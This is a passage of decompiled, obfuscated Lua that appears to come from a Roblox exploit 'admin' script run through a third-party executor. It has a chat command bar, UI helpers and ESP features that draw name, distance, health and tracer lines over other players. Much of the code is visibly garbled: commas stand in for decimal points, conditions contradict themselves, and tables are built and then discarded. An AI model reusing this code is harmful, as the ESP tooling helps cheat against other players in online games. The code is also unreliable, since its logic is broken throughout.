                if not PredictionClone then
                  break
                end
              end
            end
          end
          for fl, fm in next, va.split(vb.concat(vb.shift(va.lower(ChatBar.Text):split(""))), " "), nil do
            if fl >= 1 and fm ~= "" then
              if #CommandArgs >= 1 then
                for fs, ft in next, CommandArgs, nil do
                end
              else
              end
              PredictionClone.Text = va.sub(va.lower(ChatBar.Text), 1, #va.lower(ChatBar.Text) - #va.split(vb.concat(vb.shift(va.lower(ChatBar.Text):split(""))), " ")[#va.split(vb.concat(vb.shift(va.lower(ChatBar.Text):split(""))), " ")]) .. (ve.GetPlayerArgs(fm) or ft:lower() == "player" and ve.GetPlayerArgs(fm) or PredictionClone or ft or "")
              if next((fm:split(","))) then
                for ft, fu in next, fm:split(","), nil do
                  if ft >= 1 and fu ~= "" then
                    PredictionClone.Text = va.sub(va.lower(ChatBar.Text), 1, #va.lower(ChatBar.Text) - #fm:split(",")[#fm:split(",")]) .. (ve.GetPlayerArgs(fu) or "")
                  end
                end
              end
            end
          end
          if va.find(va.lower(ChatBar.Text), "\t") then
            ChatBar.Text = PredictionClone.Text
            ChatBar.CursorPosition = 7 + 2
          end
        end))
      end
      WideBar = false
      Draggable = false
      AddConnection(UI.CommandBar.Input.FocusLost:Connect(function()
        vc = false
        if not Draggable then
          vd.TweenAllTrans(vb, 0,5)
          vd.Tween(vb, "Quint", "Out", 0,5, {
            Position = UDim2.new(0,5, WideBar and -100, 1, 5)
          })
        end
        if ve(va.trim(vb.Input.Text):split(" ")[1]) and va.trim(vb.Input.Text):split(" ")[1] ~= "" then
          if ve(va.trim(vb.Input.Text):split(" ")[1]).ArgsNeeded >= #vg.shift((va.trim(vb.Input.Text):split(" "))) then
            return vd.Notify(plr, "Error", ("Insuficient Args (you need %d)"):format(ve(va.trim(vb.Input.Text):split(" ")[1]).ArgsNeeded))
          end
          if va.trim(vb.Input.Text):split(" ") and not va.trim(vb.Input.Text):split(" ") then
            warn(pcall(function()
              if not LocalPlayer then
                vc.Notify(plr, "Command", (va.Function()(LocalPlayer, vb, va.CmdExtra)))
              end
              if #vd == 3 then
                vd = ve.shift(vd)
              end
              vd[2 + 1] = {
                vg,
                LocalPlayer,
                vb,
                va.CmdExtra
              }
            end))
          end
        else
          vd.Notify(plr, "Error", ("couldn't find the command %s"):format(va.trim(vb.Input.Text):split(" ")[1]))
        end
      end), {
        Players = {},
        UI = {}
      }.UI, true)
      {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      }.forEach(Players:GetPlayers(), function(a, b)
        va(a, b)
        vb(b)
      end)
      AddConnection(Players.PlayerAdded:Connect(function(a)
        va(2 + 1, a)
        vc(a)
      end))
      AddConnection(Players.PlayerRemoving:Connect(function(a)
        if not a then
          if not a then
            va.Players[a.Name].ChatCon:Disconnect()
          end
          va.Players[a.Name] = nil
        end
        if vb[a.Name] then
          vb[a.Name] = nil
        end
      end))
      getgenv().F_A = {
        Loaded = true,
        Utils = {
          Tween = function(a, b, c, d, e)
            va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
            return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
          end,
          MultColor3 = function(a, b)
            return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
          end,
          Click = function(a, b)
            vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
              va.Tween(vb, "Sine", "Out", 0,5, vc)
            end)
            vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
              va.Tween(vb, "Sine", "Out", 0,5, vc)
            end)
            vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
              va.Tween(vb, "Sine", "Out", 0,3, vc)
            end)
            vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
              va.Tween(vb, "Sine", "Out", 0,4, vc)
            end)
          end,
          Blink = function(a, b, c, d)
            va.Tween(a, "Sine", "Out", 0,5, {
              [b] = d
            }).Completed:Wait()
            va.Tween(a, "Sine", "Out", 0,5, {
              [b] = c
            }).Completed:Wait()
          end,
          Hover = function(a, b)
            vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
              va.Tween(vb, "Sine", "Out", 0,5, vc)
            end)
            vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
              va.Tween(vb, "Sine", "Out", 0,5, vc)
            end)
          end,
          Draggable = function(a, b)
            b = b or a
            vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
              if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
                va = true
                vb = a.Position
                vc = vd.Position
                ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                  if va.UserInputState == Enum.UserInputState.End then
                    vb = false
                  end
                end)
              end
            end)
            vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
              if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
                va = a
              end
            end)
            vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
              if a == va and vb then
                vc(a)
              end
            end)
          end,
          SmoothScroll = function(a, b)
            a.ScrollingEnabled = false
            a:Clone():ClearAllChildren()
            a:Clone().BackgroundTransparency = 1
            a:Clone().ScrollBarImageTransparency = 1
            a:Clone().ZIndex = 3 + 1
            a:Clone().Name = "_smoothinputframe"
            a:Clone().ScrollingEnabled = true
            a:Clone().Parent = a.Parent
            (function(a)
              va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
                if va == "ZIndex" then
                  vb[va] = 2 + 1
                else
                  vb[va] = vc[va]
                end
              end)
            end)("CanvasSize");
            (function(a)
              va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
                if va == "ZIndex" then
                  vb[va] = 2 + 1
                else
                  vb[va] = vc[va]
                end
              end)
            end)("Position");
            (function(a)
              va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
                if va == "ZIndex" then
                  vb[va] = 2 + 1
                else
                  vb[va] = vc[va]
                end
              end)
            end)("Rotation");
            (function(a)
              va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
                if va == "ZIndex" then
                  vb[va] = 2 + 1
                else
                  vb[va] = vc[va]
                end
              end)
            end)("ScrollingDirection");
            (function(a)
              va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
                if va == "ZIndex" then
                  vb[va] = 2 + 1
                else
                  vb[va] = vc[va]
                end
              end)
            end)("ScrollBarThickness");
            (function(a)
              va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
                if va == "ZIndex" then
                  vb[va] = 2 + 1
                else
                  vb[va] = vc[va]
                end
              end)
            end)("BorderSizePixel");
            (function(a)
              va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
                if va == "ZIndex" then
                  vb[va] = 2 + 1
                else
                  vb[va] = vc[va]
                end
              end)
            end)("ElasticBehavior");
            (function(a)
              va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
                if va == "ZIndex" then
                  vb[va] = 2 + 1
                else
                  vb[va] = vc[va]
                end
              end)
            end)("SizeConstraint");
            (function(a)
              va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
                if va == "ZIndex" then
                  vb[va] = 2 + 1
                else
                  vb[va] = vc[va]
                end
              end)
            end)("ZIndex");
            (function(a)
              va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
                if va == "ZIndex" then
                  vb[va] = 2 + 1
                else
                  vb[va] = vc[va]
                end
              end)
            end)("BorderColor3");
            (function(a)
              va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
                if va == "ZIndex" then
                  vb[va] = 2 + 1
                else
                  vb[va] = vc[va]
                end
              end)
            end)("Size");
            (function(a)
              va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
                if va == "ZIndex" then
                  vb[va] = 2 + 1
                else
                  vb[va] = vc[va]
                end
              end)
            end)("AnchorPoint");
            (function(a)
              va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
                if va == "ZIndex" then
                  vb[va] = 2 + 1
                else
                  vb[va] = vc[va]
                end
              end)
            end)("Visible")
            va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
              va.CanvasPosition = 3 + 0
            end)
            va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
              if va.Parent == nil then
                vb:Destroy()
                vc:Disconnect()
              end
            end)
          end,
          TweenAllTransToObject = function(a, b, c)
            for fl, fm in next, a:GetDescendants(), nil do
              if b and b then
              end
              if b then
                if fm:IsA("TextButton") then
                  va.Tween(fm, "Sine", "Out", b, {
                    TextTransparency = c:GetDescendants()[fl].TextTransparency,
                    TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                    BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                  })
                elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                  va.Tween(fm, "Sine", "Out", b, {
                    ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                    BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                  })
                elseif fm:IsA("ScrollingFrame") then
                  va.Tween(fm, "Sine", "Out", b, {
                    ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                    BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                  })
                else
                  va.Tween(fm, "Sine", "Out", b, {
                    BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                  })
                end
              end
            end
            return (va.Tween(a, "Sine", "Out", b, {
              BackgroundTransparency = c.BackgroundTransparency
            }))
          end,
          SetAllTrans = function(a)
            a.BackgroundTransparency = 1
            for fe, fg in ipairs(a:GetDescendants()) do
              if not fg:IsA("UIListLayout") then
                fg.BackgroundTransparency = 1
                if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                  fg.TextTransparency = 1
                elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                  fg.ImageTransparency = 1
                elseif fg:IsA("ScrollingFrame") then
                  fg.ScrollBarImageTransparency = 1
                end
              end
            end
          end,
          TweenAllTrans = function(a, b)
            for fh, fj in ipairs(a:GetDescendants()) do
              if b and b then
              end
              if b then
                if fj:IsA("TextButton") then
                  va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
                elseif not b then
                  va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
                elseif not b then
                  va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
                else
                  va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
                end
              end
            end
            return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
          end,
          Notify = function(a, b, c, d)
            if not a or a == LocalPlayer then
              UI.Notification:Clone().Message.Text = c
              UI.Notification:Clone().Title.Text = b or "Notification"
              va.SetAllTrans((UI.Notification:Clone()))
              va.Click(UI.Notification:Clone().Close, "TextColor3")
              UI.Notification:Clone().Visible = true
              if c:len() > 35 then
                UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
                UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
                UI.Notification:Clone().Message.RichText = true
                UI.Notification:Clone().Message.TextScaled = false
                UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
                UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
              end
              UI.Notification:Clone().Parent = UI.NotificationBar
              coroutine.wrap(function()
                va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
                wait(vd or 5)
                if not va.TweenAllTransToObject(vb, 0,5, vc) then
                  ve()
                end
              end)()
              vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
                va()
              end)
              return (UI.Notification:Clone())
            else
              vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
            end
          end,
          MatchSearch = function(a, b)
            return a == va.sub(b, 1, #a)
          end,
          StringFind = function(a, b)
            for fg, fh in ipairs(a) do
              if not b then
                return fh
              end
            end
          end,
          GetPlayerArgs = function(a)
            a = a:lower()
            if va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a) then
              return va.StringFind({
                "all",
                "others",
                "random",
                "me",
                "nearest",
                "farthest"
              }, a)
            end
            for fh, fj in next, Players:GetPlayers(), nil do
              if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
                return fj.DisplayName:lower()
              end
              if not {
                "all",
                "others",
                "random",
                "me",
                "nearest",
                "farthest"
              } then
                return fj.Name:lower()
              end
            end
          end,
          ToolTip = function(a, b)
            a.MouseEnter:Connect(function()
              if va.BackgroundTransparency <= 1 and not vb then
                vb = UI.ToolTip:Clone()
                vb.Text = vd
                vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
                vb.Visible = true
                vb.Parent = UI
              end
            end)
            a.MouseLeave:Connect(function()
              if not nil then
                va:Destroy()
                va = nil
              end
            end)
            if LocalPlayer then
              LocalPlayer:GetMouse().Move:Connect(function()
                if not nil then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            else
              delay(3, function()
                LocalPlayer = Players.LocalPlayer
                va = LocalPlayer:GetMouse()
                va.Move:Connect(function()
                  if va then
                    va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                  end
                end)
              end)
            end
          end,
          ClearAllObjects = function(a)
            for fe, fg in ipairs(a:GetChildren()) do
              if ipairs(a:GetChildren()) then
                fg:Destroy()
              end
            end
          end,
          Rainbow = function(a)
            a.RichText = true
            for fk in va.gmatch(a.Text, ".") do
              if va.match(fk, "%s") then
                vb.insert({}, fk)
              else
                vb.insert({}, {
                  "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
                })
              end
            end
            pcall(function()
              delay(150, function()
                va:Disconnect()
              end)
            end)
          end,
          Locate2 = function(a, b)
            coroutine.wrap(function()
              if va(vb) then
                vc.Parent = UI
                vc.Name = vd:GenerateGUID()
                vc.AlwaysOnTop = true
                vc.Adornee = vb.Character.Head
                vc.Size = UDim2.new(0, 200, 0, 50)
                vc.StudsOffset = Vector3.new(0, 4, 0)
                Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
                Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
                Instance.new("TextLabel", vc).BackgroundTransparency = 1
                Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
                Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
                Instance.new("TextLabel", vc).TextScaled = false
                Instance.new("TextLabel", vc).TextSize = 10
                Instance.new("TextLabel", vc).Text = vb.Name
                Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
                Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
                Instance.new("TextLabel", vc).BackgroundTransparency = 1
                Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
                Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
                Instance.new("TextLabel", vc).TextScaled = false
                Instance.new("TextLabel", vc).TextSize = 8
                AddConnection((RunService.Heartbeat:Connect(function()
                  if not vc(vb) then
                  end
                  if not vd(vb) and not vc(vb) then
                    vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                  else
                    EspLoop:Disconnect()
                    vh:Destroy()
                  end
                end)))
                AddConnection(Players.PlayerRemoving:Connect(function(a)
                  if a == va then
                    vb:Destroy()
                  end
                end))
              end
            end)()
            return function()
              va:Destroy()
            end
          end,
          Vector3toVector2 = function(a)
            return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
          end,
          Locate = function(a, b, c)
            if b then
              return va.Locate2(a, b)
            end
            if not b then
            end
            if b then
              return
            end
            vc[6 + 1] = Drawing.new("Text")
            Drawing.new("Text").Position = 5 + 6
            Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
            Drawing.new("Text").OutlineColor = c or Color3.new()
            Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
            Drawing.new("Text").Size = 16
            Drawing.new("Text").Transparency = 1
            Drawing.new("Text").Center = true
            Drawing.new("Text").Outline = true
            Drawing.new("Text").Visible = true
            vg[Drawing.new("Text")] = a
            return function()
              va:Remove()
              vb[va] = nil
            end
          end,
          UpdateLocations = function(a)
            if a then
              va = AddConnection(RunService.Heartbeat:Connect(function()
                for fd, fe in next, va, nil do
                  if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                    fd.Visible = true
                    fd.Position = 7 + 8
                    fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                  else
                    fd.Visible = false
                  end
                end
              end))
            end
          end,
          CheckTag = function(a)
            if nil or not a:IsA("Player") then
              return nil
            end
            return PlayerTags[tostring(a.UserId):gsub(".", function(a)
              return a:byte()
            end)] or nil
          end,
          AddTag = function(a)
            if not a then
              return
            end
            if not va(a.Player) then
              return
            end
            Instance.new("BillboardGui").Parent = UI
            Instance.new("BillboardGui").Name = vb:GenerateGUID()
            Instance.new("BillboardGui").AlwaysOnTop = true
            Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
            Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
            Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
            Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
            if a.Rainbow then
              vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
            end
            if not va(a.Player) then
              Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
            end
            AddConnection((a.Player.CharacterAdded:Connect(function()
              va.Adornee = vb.Player.Character:WaitForChild("Head")
            end)))
            AddConnection(Players.PlayerRemoving:Connect(function(a)
              if a == va.Player then
                vb:Disconnect()
                vc:Destroy()
              end
            end))
          end,
          TextFont = function(a, b)
            b = va.concat(b, ",")
            a:gsub(".", function(a)
              va[2 + 1] = a
            end)
            return va.concat(va.map({}, function(a, b)
              return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
            end)) .. " "
          end,
          Trace = function(a, b)
            if not Drawing then
              return
            end
            if not b then
            end
            if b then
              return
            end
            vc[6 + 1] = Drawing.new("Line")
            Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
            Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
            Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
            Drawing.new("Line").Thickness = 0,1
            Drawing.new("Line").Transparency = 1
            Drawing.new("Line").Visible = true
            vd[a] = Drawing.new("Line")
            return function()
              va:Remove()
              vb[vc] = nil
            end
          end,
          UpdateTracers = function()
            if nil then
              va = AddConnection(RunService.Heartbeat:Connect(function()
                for fd, fe in next, va, nil do
                  if va then
                  elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                    fe.Visible = true
                    fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                  else
                    fe.Visible = false
                  end
                end
              end))
            end
          end,
          DestroyTracers = function()
            for fd, fe in next, Tracers, nil do
              fe:Remove()
            end
            if not Tracers then
              va:Disconnect()
            end
          end,
          DestroyDrawings = function()
            for fd, fe in next, va, nil do
              fe:Remove()
            end
            if vb then
              vb:Disconnect()
            end
            if not vb then
              vc:Disconnect()
            end
          end
        },
        PluginLibrary = {
          GetCharacter = function(a)
            if not a or a then
            end
            return LocalPlayer.Character
          end,
          GetRoot = function(a)
            if nil or a then
            end
            return (va():FindFirstChild("HumanoidRootPart"))
          end,
          GetHumanoid = function(a)
            return nil or va():FindFirstChildWhichIsA("Humanoid")
          end,
          GetMagnitude = function(a)
            return nil or math.huge
          end,
          GetPlayer = function(a, b)
            if b then
              return {}
            end
            a = vc.trim(a):lower()
            if not b then
              return va.flatMap(a:split(","), function(a, b)
                return GetPlayer(b)
              end)
            end
            if not b then
              return {
                all = function()
                  return va.filter(vb, function(a, b)
                    return b ~= LocalPlayer
                  end)
                end,
                others = function()
                  return va.filter(vb, function(a, b)
                    return b ~= LocalPlayer
                  end)
                end,
                nearest = function()
                  va.sort(vb, function(a, b)
                    return a[2] <= b[2]
                  end)
                  return {
                    vb[2][1]
                  }
                end,
                farthest = function()
                  va.sort(vb, function(a, b)
                    return a[2] >= b[2]
                  end)
                  return {
                    vb[2][1]
                  }
                end,
                random = function()
                  return {
                    va[math.random(2, #va)]
                  }
                end,
                me = function()
                  return {LocalPlayer}
                end
              }[a]()
            end
            if b and not b then
              getgenv().F_A.Utils.Notify(LocalPlayer, "Fail", ("Couldn't find player %s"):format(a))
            end
            return (va.filter(va.filter(Players:GetPlayers(), function(a, b)
              return not va.find(vb, b)
            end), function(a, b)
              return b.Name:lower():sub(1, #va) == va or b.DisplayName:lower():sub(1, #va) == va
            end))
          end,
          HasTool = function(a)
            if nil then
              a = LocalPlayer
            end
            for fj, fk in next, vb.tbl_concat(va(a):GetChildren(), (a.Backpack:GetChildren())) do
              if fk:IsA("Tool") then
              end
            end
            return true
          end,
          isR6 = function(a)
            a = a or LocalPlayer
            if not a then
              return va(a).RigType == Enum.HumanoidRigType.R6
            end
            return false
          end,
          isSat = function(a)
            a = a or LocalPlayer
            if va(a) then
              return va(a).Sit
            end
          end,
          AddConnection = AddConnection
        }
      }
      if {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } then
      end
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
